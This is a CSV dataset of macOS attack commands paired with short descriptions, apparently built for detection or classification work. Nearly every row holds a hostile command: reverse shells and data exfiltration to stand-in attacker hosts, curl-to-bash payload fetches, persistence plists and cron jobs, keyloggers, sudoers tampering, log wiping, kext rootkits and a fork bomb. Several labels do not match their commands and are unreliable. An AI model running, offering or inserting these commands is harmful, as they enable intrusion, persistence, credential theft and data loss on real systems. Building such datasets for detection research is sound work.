"cmd","description"
"sudo tcpdump -i any port 53 -w ~/Desktop/dns_queries.pcap","Monitoring DNS queries to track websites visited by a user on a macOS system."
"launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via launchd by loading a malicious agent."
"bash -i >& /dev/tcp/attacker.com/4444 0>&1","Establishing a reverse shell to maintain remote access."
"sudo mv /tmp/.hidden /usr/local/bin/.hidden && echo 'alias ls=""ls /.hidden""' >> ~/.bash_profile","Rootkit installation using a hidden file in the system directory."
"sudo echo 'pfctl -a com.apple/250.ApplicationFirewall -sr add pass out quick on en0 all' >> /etc/pf.conf && sudo pfctl -f /etc/pf.conf","Hooking the network stack to monitor and manipulate outgoing connections."
"ps aux | grep -v 'process_to_hide' > /tmp/filtered_process_list && mv /tmp/filtered_process_list /tmp/process_list","Malicious actors may attempt to hide their processes from system monitoring tools to evade detection."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.stealth.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-fsSL</string>
		<string>http://malicious-url.com/hidden_script.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>LaunchOnlyOnce</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.stealth.agent.plist && launchctl load ~/Library/LaunchAgents/com.stealth.agent.plist","Stealth launch agents can be used to persistently execute hidden malicious activities on a macOS system."
"osascript -e 'tell app ""ARDAgent"" to do shell script ""echo $(whoami) > /tmp/creds && scp /tmp/creds attacker@malicious-server.com:/stolen_creds""'","Malicious actors are using remote desktop protocol exploits to perform RDP credential theft on macOS systems."
"open /path/to/malicious_attachment; curl http://malicious-url.com/payload.sh | sh","Malicious payload execution from an email attachment exploiting a zero-day vulnerability."
"sudo echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.daemon</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/malicious_script.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' | sudo tee /Library/LaunchDaemons/com.malicious.daemon.plist && sudo chmod 644 /Library/LaunchDaemons/com.malicious.daemon.plist && sudo launchctl load /Library/LaunchDaemons/com.malicious.daemon.plist","Persistence mechanism involving a launch daemon that executes a malicious script on system startup."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/path/to/keylogger.app"", hidden:false}'","Persistence of a keylogger by adding it to the user's login items."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.reverse.shell</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.reverse.shell.plist && launchctl load ~/Library/LaunchAgents/com.reverse.shell.plist","Persistence via malicious plist to establish a reverse shell on system boot."
"find ~/Documents -type f -name '*.confidential' -exec gpg --encrypt --recipient 'recipient@example.com' {} \; -exec echo 'File {} has been encrypted.' \; -exec mail -s 'Encrypted Confidential File' recipient@example.com -A {}.gpg \;","Data exfiltration by emailing confidential information after detecting sensitive files and encrypting them before transmission."
"0 * * * * /usr/bin/curl -s http://malicious-url.com/script.sh | /bin/bash","Persistence mechanism using a cron job to download and execute a script every hour."
"curl -s http://malicious-url.com/install.sh | /bin/bash","Malware installation via a disguised Bash script downloaded from the internet."
"hdiutil attach http://malicious-url.com/rogue.dmg -nobrowse; cp -R /Volumes/RogueApp/RogueApplication.app /Applications/","Trojan applications being embedded into the system through a rogue application disguised as a legitimate one."
"sudo kextload /Library/Extensions/malicious.kext","Rootkit embedding by appending a malicious kernel extension to the authorized kexts."
"nc -l 9999 > /tmp/connection &","Creating stealth network listeners that bind to a port and wait for incoming connections."
"while true; do cat /dev/null > /tmp/keystroke.log; sleep 10; done &","Keyboard input logging using macOS native tools."
"while true; do screencapture -x ~/Library/.hidden/screenshot-$(date +%Y%m%d%H%M%S).png; sleep 300; done &","Capturing screenshots periodically and saving them to a hidden directory."
"echo ""0 * * * * /bin/bash -c \""$(curl -fsSL http://malicious-url.com/script.sh)\"""" | crontab -","Persistence on macOS by creating a cron job to download and execute a remote script every hour."
"find /some/directory -type f -exec chmod +x {} \;","A scenario where a script recursively changes file permissions in a directory to grant execution rights indiscriminately, potentially allowing the execution of unauthorized or malicious scripts."
"cp /bin/sh /tmp/privileged_sh && chmod u+s /tmp/privileged_sh","Privilege escalation by exploiting writable setuid binaries."
"zip -er encrypted_files.zip /path/to/sensitive/data/*","Compressing sensitive files in a directory and encrypting the archive with a password, bypassing file access permissions for zip."
":(){ :|:& };:","Malicious command to create a fork bomb causing system resource exhaustion on macOS."
"open /path/to/malicious.app","Malware installation through a user executing a malicious payload received via email attachment."
"bash -c ""$(curl -fsSL http://phishing-link.com/install.sh)""","Executing a script that was downloaded from a phishing email link to establish persistent access."
"tar czf - ~/.ssh/ | curl -F 'file=@-' http://attacker-server.com/upload","Spear-phishing attack that tricks the user into running a command that exfiltrates the .ssh directory to a remote server."
"sudo tcpdump -i en0 -w ~/Desktop/vpntraffic.pcap 'port 1194'","Intercepting data from unpatched VPN services using a man-in-the-middle attack."
"zip -er encrypted_docs.zip /path/to/sensitive/documents/ && echo 'Subject: Encrypted Documents' | sendmail -A gmail -a encrypted_docs.zip -t target@example.com","Compressing sensitive documents into a password-protected zip file before exfiltration."
"osascript -e 'do shell script ""echo 'while :; do curl -fsSL http://malicious-url.com/payload.sh | bash; sleep 300; done' > /Library/Scripts/malicious_script.sh && chmod +x /Library/Scripts/malicious_script.sh && (crontab -l 2>/dev/null; echo ""*/5 * * * * /Library/Scripts/malicious_script.sh"") | crontab -"" with administrator privileges'","Persistence via scripting addition that loads a malicious script to execute periodically."
"mkdir ~/Library/.hidden && echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.hidden.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/bash</string>
		<string>-c</string>
		<string>curl -fsSL http://malicious-url.com/script.sh | bash</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>StartInterval</key>
	<integer>3600</integer>
</dict>
</plist>' > ~/Library/.hidden/com.hidden.agent.plist && launchctl load ~/Library/.hidden/com.hidden.agent.plist","Persistence via hidden launch agent that executes a script every hour."
"ps aux","Enumeration of running processes to identify potential targets for unauthorized termination."
"kill -9 <PID>","Terminating a process using its PID without authorization."
"mv malicious_program /usr/local/bin/<legitimate_process_name>","Masquerading a malicious process with the same name as a legitimate system process."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.agent</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/bin/curl</string>
 <string>-o</string>
 <string>/tmp/script.sh</string>
 <string>http://malicious-url.com/payload.sh</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
 <key>StartInterval</key>
 <integer>300</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious plist file added to LaunchAgents to execute a script every 5 minutes."
"curl -s http://malicious-url.com/install.sh | sh","Malware installation using a disguised script that downloads and executes a payload from a remote server."
"mv /path/to/legitimate/binary /path/to/legitimate/binary.bak && curl -o /path/to/legitimate/binary http://malicious-url.com/trojan && chmod +x /path/to/legitimate/binary","Trojan application execution by replacing an existing legitimate binary with a malicious one."
"cp ~/Library/Application\ Support/Google/Chrome/Default/Cookies /tmp/.hidden_cookies","Credential harvesting script that locates and copies browser cookies to a hidden file."
"git clone https://malicious-phishing-toolkit.com/repo.git && cd repo && python -m SimpleHTTPServer 8080","Phishing toolkit setup by creating a local server to host phishing pages."
"defaults write ~/Library/LaunchAgents/com.example.plist ProgramArguments -array-add '/path/to/malicious/script.sh'","Persistence via Launch Agent by modifying an existing plist to execute a malicious script at login."
"osascript -e 'repeat' -e 'delay 10' -e 'set theText to do shell script ""ioreg -n IOHIDSystem""' -e 'do shell script ""echo "" & theText & "" | nc -u attacker.com 9999""' -e 'end repeat'","Capturing and exfiltrating user keystrokes from a macOS system."
"osascript -e 'do shell script ""echo \""int main() {char large_string[128]; for(int i = 0; i < 200; i++) large_string[i] = 'A'; return 0;}\"" > /tmp/overflow.c && gcc /tmp/overflow.c -o /tmp/overflow && chmod u+s /tmp/overflow && /tmp/overflow"" with administrator privileges'","Gaining root access by exploiting a buffer overflow vulnerability in a privileged program on macOS."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.apple.keyloggerservice</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/keylogger</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.apple.keyloggerservice.plist && launchctl load ~/Library/LaunchAgents/com.apple.keyloggerservice.plist","Persistence via malicious plist to install a keylogger"
"curl -o ~/Downloads/keylogger http://untrusted-source.com/keylogger && chmod +x ~/Downloads/keylogger && ~/Downloads/keylogger","Downloading a keylogger application from an untrusted source"
"osascript -e 'do shell script ""sudo cp /path/to/keylogger /usr/local/bin/keylogger && sudo chmod +x /usr/local/bin/keylogger"" with administrator privileges'","Injecting a keylogger to monitor user input"
"0 * * * * /usr/bin/curl -s http://malicious-url.com/script.sh | /bin/bash","A crontab entry that downloads a script from a remote server and executes it every hour."
"0 * * * * /usr/bin/curl -fsSL http://malicious-url.com/script.sh | /bin/bash","Persistence via a malicious cron job that downloads and executes a script every hour."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.keylogger</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/keylogger</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.malicious.keylogger.plist","Persistence via malicious plist to execute a keylogger at login."
"echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> ~/.bash_profile","Establishing a reverse shell to maintain remote access."
"nc -l 9999 > incoming_connection","Creating a network listener waiting for incoming connections."
"curl -s http://phishing-url.com/malware.sh > /tmp/update.sh && chmod +x /tmp/update.sh && /tmp/update.sh","Malware installation through a disguised Bash script downloaded from a phishing email."
"osascript -e 'Tell application ""System Events"" to display dialog ""System Update requires your password:"" default answer """" with hidden answer' > /tmp/credentials.txt","Phishing attack script that masquerades as a system update to trick the user into providing their credentials."
"echo 'alias sudo=""sudo env PATH=$PATH $@ | tee -a /tmp/keystroke.log""' >> ~/.bash_profile","Credential interception by modifying the .bash_profile to capture keystrokes."
"curl -s http://malicious-domain.com/keylogger.sh | bash &>/dev/null","Keylogger installation using a hidden curl command within a seemingly benign script."
"curl -s http://phishing-domain.com/malware.sh > /tmp/update.sh && chmod +x /tmp/update.sh && /tmp/update.sh","Malware installation through a disguised Bash script downloaded from a phishing email attachment."
"echo 'script -q /dev/null | cat >> ~/.keystroke_log & disown' >> ~/.bash_profile","Intercepting credentials by injecting a script into the .bash_profile that captures keystrokes."
"echo 'export http_proxy=http://malicious-proxy.com:8080' >> ~/.bashrc && echo 'export https_proxy=http://malicious-proxy.com:8080' >> ~/.bashrc","SSL stripping attack by redirecting traffic through a malicious proxy using a script."
"sudo nvram boot-args=""kextload=/Library/Extensions/malicious.kext""","Persistence via kernel extension loading at boot time."
"echo ""0 * * * * curl -fsSL http://malicious-url.com/script.sh | bash"" | crontab -","Establishing a cron job to download and execute a script every hour."
"echo ""SHELL=/bin/sh\nPATH=/usr/bin:/bin\n1 5 * * * root run-parts --report /etc/cron.hourly"" > /etc/anacrontab","Manipulating anacron to execute a malicious script."
"echo '*/30 * * * * /usr/bin/osascript -e ""do shell script \""sudo -i\"" with administrator privileges""' >> /var/at/tabs/root","Persistence via unauthorized remote login followed by privilege escalation using a cron job to maintain access."
"(crontab -l 2>/dev/null; echo ""* * * * * curl -fsSL http://malicious-url.com/payload.sh | sh"") | crontab -","Persistence via cron job by editing crontab entries to execute a script from a remote server every minute."
"osascript -e 'do shell script ""bash -c \""$(curl -fsSL http://malicious-url.com/payload.sh)\"""" with administrator privileges'","Malicious payload execution via an email attachment disguised as a trusted document, which when opened, executes a shell script embedded within."
"osascript -e 'tell app ""Finder"" to set frontmost of process ""Preview"" to true' -e 'tell app ""System Events"" to keystroke ""r"" using {command down}' -e 'tell app ""System Events"" to keystroke "" /path/to/malicious/script.sh""' -e 'tell app ""System Events"" to keystroke return'","A trojan is being distributed via email attachments that exploit vulnerabilities in document readers to execute a malicious payload."
"open ~/Downloads/malicious_attachment.dmg && xattr -d com.apple.quarantine ~/Downloads/malicious_app.app && ~/Downloads/malicious_app.app/Contents/MacOS/malicious_executable","Malware installation through the execution of a malicious payload received via email attachment."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.sniffer</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/sudo</string>
		<string>/usr/sbin/tcpdump</string>
		<string>-i</string>
		<string>en0</string>
		<string>-w</string>
		<string>/tmp/sniffer.pcap</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.sniffer.plist && launchctl load ~/Library/LaunchAgents/com.malicious.sniffer.plist","Persistence via malicious plist to execute a network traffic sniffer on system startup."
"sudo rm -rf /var/log/*","Unauthorized access to a macOS system followed by deletion of system logs to cover tracks."
"sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.auditd.plist","Disabling audit logs to prevent recording of future actions on the system."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/backdoor.sh</string>
		<string>http://malicious-url.com/backdoor.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via malicious plist for remote access."
"osascript -e 'do shell script ""echo 'launchctl load /Library/LaunchDaemons/com.exploit.agent.plist' && echo 'chmod 644 /Library/LaunchDaemons/com.exploit.agent.plist' && echo 'chown root:wheel /Library/LaunchDaemons/com.exploit.agent.plist'"" with administrator privileges'","Persistence via malicious plist file to exploit a use-after-free vulnerability in macOS kernel for privilege escalation."
"while inotifywait -r -e modify,create,delete /target/directory; do cp /target/directory/* /hidden/.backup/; done","An attacker is using a shell command to monitor file system changes and copy modified files to a hidden directory."
"osascript -e 'do shell script ""curl -s http://malicious-url.com/payload.dmg -o ~/Downloads/payload.dmg && hdiutil attach ~/Downloads/payload.dmg && cp /Volumes/Payload/payload.app ~/Applications/ && open -a ~/Applications/payload.app"" with administrator privileges'","A macOS system received an email with an attachment that disguises itself as a document but executes a malicious payload when opened."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/malicious.sh</string>
		<string>http://malicious-url.com/malicious.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>StartInterval</key>
	<integer>300</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious plist to maintain access to a macOS system."
"tar cvf - /path/to/sensitive/data | gzip -c | openssl enc -aes-256-cbc -e -k password > /output/path/secure-archive.gz.enc","Data exfiltration by compressing sensitive files into a password-protected archive using gzip on a macOS system."
"zip -er keychains.zip ~/Library/Keychains && openssl base64 < keychains.zip | mail -s 'Encrypted Keychains' recipient@example.com","Extracting and emailing local keychain databases to an external recipient using encrypted email."
"sudo tcpdump -i en0 -w ~/Desktop/captured_packets.pcap","Capturing network packets for analysis on a macOS system."
"tcpdump -nnXSs 0 -i en0 'port 443'","Analyzing encrypted traffic to identify data exfiltration."
"sudo tcpdump -i en0 | nc -l 9999","Redirecting network traffic to a remote server for monitoring."
"curl -s http://example.com/malicious-script | sh","Malware installation using a disguised curl command to fetch and execute a script."
"curl -sO http://example.com/exploit.tar.gz && tar -xzf exploit.tar.gz && ./exploit/run.sh","Exploit kit execution by decompressing a downloaded archive and running an embedded script."
"echo ""* * * * * /usr/bin/curl http://c2.example.com/checkin"" | crontab -","Establishing command and control communication by adding a cron job to periodically connect to a remote server."
"cat /etc/passwd | base64 | curl -X POST -d @- http://example.com/exfil","Traffic obfuscation by using base64 encoding for data exfiltration."
"osascript -e 'do shell script ""launchctl load /Library/LaunchDaemons/com.malicious.daemon.plist"" with administrator privileges'","Persistence mechanism using scripting additions to load malicious code at startup."
"curl -s http://malicious-domain.com/fake-update.sh | sh","Malware installation through a fake software update prompt executed in the terminal."
"curl -s http://malicious-url.com/install.sh | sh","Malware installation using a disguised curl command to download and execute a script."
"echo 'echo ""malicious code"" > /etc/malicious_file' | sudo sh","Rootkit embedding by appending a malicious script to an existing system file."
"cat /etc/passwd > ~/.hidden_passwd_backup","Creation of a hidden file storing sensitive data extracted from the system."
"nohup nc -l 4444 > /dev/null 2>&1 &","Setting up a stealth network service to listen for incoming connections."
"osascript -e 'tell application ""System Events"" to make login item at end with properties {path:""/Applications/MaliciousApp.app"", hidden:false}'","Persistence via scripting additions in macOS."
"curl -s http://malicious-url.com/install.sh | sh","Malware installation using a disguised script from a remote server."
"curl -o /tmp/rootkit.kext http://malicious-url.com/rootkit.kext && sudo chown -R root:wheel /tmp/rootkit.kext && sudo kextload /tmp/rootkit.kext","Rootkit embedding through a downloaded kernel extension."
"sudo kextutil -t /path/to/malicious.kext","Kernel module injection using a malicious loadable kernel module."
"echo 'malicious_code' | sudo dd of=/dev/kmem","Kernel memory manipulation by directly writing to /dev/kmem."
"sudo tcpdump -i en0 -w ~/Desktop/captured_packets.pcap","Capturing network packets on a macOS system to analyze traffic for sensitive data."
"find ~/Documents -name '*.pdf' -exec echo {} \; | mail -s 'Confidential Documents' attacker@example.com","Exfiltrating confidential documents by emailing them to an external address."
"ps aux | grep -i 'security_tool_name' | awk '{print $2}' | xargs kill -9","A scenario where the system monitoring process list is enumerated to identify security tools that could be terminated to avoid detection."
"pkill -f 'process_name_to_terminate'","A method for an unauthorized user to terminate specific processes to weaken system security."
"launchctl load /Library/LaunchDaemons/com.malicious.daemon.plist","Installing a malicious daemon on macOS to establish persistence."
"defaults write ~/Library/LaunchAgents/com.example.agent.plist ProgramArguments -array-add '/path/to/malicious/script.sh'","A persistence mechanism that involves modifying an existing launch agent plist file to execute a malicious script at system startup."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.startup</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/local/bin/malicious_executable</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.startup.plist && launchctl load ~/Library/LaunchAgents/com.malicious.startup.plist","Creating a new startup script that runs a downloaded malicious executable every time the system boots."
"echo '*/5 * * * * curl -fsSL http://unauthorized-source.com/script.sh | /bin/bash' | crontab -","Setting up a cron job to execute a shell script from an unauthorized source every five minutes."
"chmod u+s /path/to/unauthorized/binary","Privilege escalation by setting the SUID bit on an unauthorized binary to run with root permissions."
"echo 'curl -fsSL http://malicious-url.com/remote.sh | bash' > /Applications/ImageEdit.app/Contents/MacOS/run.sh && chmod +x /Applications/ImageEdit.app/Contents/MacOS/run.sh","Persistence through trojanized image editing software that executes a remote shell script upon launch."
"curl -s http://malicious-url.com/safari_exploit.pkg > /tmp/exploit.pkg && installer -pkg /tmp/exploit.pkg -target /","Malware installation through a drive-by download exploiting Safari browser vulnerabilities."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.plist</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/bin/curl</string>
 <string>-o</string>
 <string>/tmp/script.sh</string>
 <string>http://malicious-url.com/payload.sh</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.plist && launchctl load ~/Library/LaunchAgents/com.malicious.plist","Persistence via malicious plist file to maintain remote access."
"zip -r /tmp/documents.zip ~/Documents && curl -T /tmp/documents.zip ftp://attacker.com/uploads/","Automatic exfiltration of documents from a macOS system using zip compression before transmission."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd""><plist version=""1.0""><dict><key>Label</key><string>com.backdoor.agent</string><key>ProgramArguments</key><array><string>/usr/bin/env</string><string>sh</string><string>-c</string><string>/usr/bin/curl http://attacker.com/backdoor.sh | /bin/sh</string></array><key>RunAtLoad</key><true/><key>StartInterval</key><integer>300</integer></dict></plist>' > ~/Library/LaunchAgents/com.backdoor.agent.plist && launchctl load ~/Library/LaunchAgents/com.backdoor.agent.plist","Persistence via malicious plist to establish a backdoor for remote access and user activity monitoring."
"sox -d -t mp3 http://malicious-url.com/recording.mp3 trim 0 10 && curl --upload-file ./recording.mp3 http://malicious-url.com/upload","Capture and exfiltrate audio recordings from the macOS system."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.keylogger</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/python</string>
		<string>/tmp/keyboardLogger.py</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>StartInterval</key>
	<integer>60</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.malicious.keylogger.plist","Persistent keyboard input logging using a malicious daemon on macOS."
"osascript -e 'do shell script ""curl -s http://malicious-url.com/trojan-payload.dmg -o /tmp/trojan-payload.dmg && hdiutil attach /tmp/trojan-payload.dmg && cp -R /Volumes/TrojanPayload/Trojan.app /Applications/ && hdiutil detach /Volumes/TrojanPayload && open /Applications/Trojan.app"" with administrator privileges'","Infection of macOS system through a macro-enabled document received via email, which executes a trojan payload when opened."
"echo '* * * * * root /path/to/malicious/script.sh' >> /etc/crontab","Privilege escalation by injecting a script into system-wide cron directories for persistence."
"TF=$(mktemp) && echo 'ALL ALL=(ALL) NOPASSWD: ALL' > $TF && sudo visudo -cf $TF && if sudo visudo -cf $TF; then sudo visudo -f $TF; fi","Exploiting sudo misconfigurations to escalate privileges on a macOS system."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/malicious.sh</string>
		<string>http://malicious-url.com/malicious.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious plist file creation for launch agents."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.plist</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/bin/python</string>
 <string>/path/to/heap_spray.py</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.plist && launchctl load ~/Library/LaunchAgents/com.malicious.plist","Persistence via malicious plist file to execute a heap spraying attack exploiting a use-after-free vulnerability for privilege escalation."
"while true; do screencapture -x ~/Library/Caches/screenshot_$(date '+%Y%m%d%H%M%S').png; sleep 300; done & curl -T ~/Library/Caches/*.png ftp://attacker.com/uploads/","Automated screen capture script to exfiltrate data from a macOS system."
"sudo kextload /Library/Extensions/malicious_extension.kext","Persistence via a malicious kernel extension loaded at boot time."
"sudo profiles -I -F /path/to/malicious.mobileconfig","Installation of a malicious configuration profile to change system settings."
"echo 'ALL ALL=(ALL) NOPASSWD: ALL' | sudo tee -a /etc/sudoers","Modification of the sudoers file to grant unauthorized admin privileges."
"0 * * * * /usr/bin/curl -fsSL http://malicious-url.com/payload.sh | /bin/bash","Persistence via cron job to download and execute a script every hour."
"echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config && /usr/bin/ssh-keygen -t rsa -N '' -f ~/.ssh/id_rsa && cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys","Modifying the SSH configuration to allow password authentication and setting up an SSH key for unauthorized access."
"scp ~/.ssh/id_rsa user@remote-server:/path/to/upload","Exfiltrating SSH private keys to a remote server."
"bash -i >& /dev/tcp/remote-server/8080 0>&1","Setting up remote access by installing a reverse shell."
"echo 'bash -i >& /dev/tcp/remote-server/8080 0>&1' | base64 | bash","Initiating a reverse shell with obfuscated shellcode."
